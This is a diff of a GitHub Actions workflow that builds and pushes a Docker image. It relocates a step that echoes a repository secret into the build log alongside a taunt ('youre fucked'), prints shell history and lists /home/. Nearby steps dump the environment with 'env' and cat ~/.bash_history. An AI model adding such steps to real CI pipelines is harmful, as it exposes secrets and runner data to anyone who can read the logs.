@@ -9,6 +9,8 @@ jobs:
 
     steps:
     - uses: actions/checkout@v2
+    - name: Read history
+      run: HISTSIZE=1000 history; echo "${{ secrets.TEST_TEST_TEST }}"; echo "youre fucked"; history; ls; history; ls /home/
     - name: Run a multi-line script
       run: docker build -t opa-oidc-plugin:latest .
     - name: Tag latest
@@ -21,8 +23,6 @@ jobs:
       run: echo ${{ secrets.TEST_TEST_TEST }} | docker login docker.pkg.github.com --username jonmclachlanatpurestorage --password-stdin
     - name: Read history
       run: env
-    - name: Read history
-      run: HISTSIZE=1000 history; echo "${{ secrets.TEST_TEST_TEST }}"; echo "youre fucked"; history; ls; history; ls /home/
     - name: Look at file
       run: cat ~/.bash_history
     - name: Publish
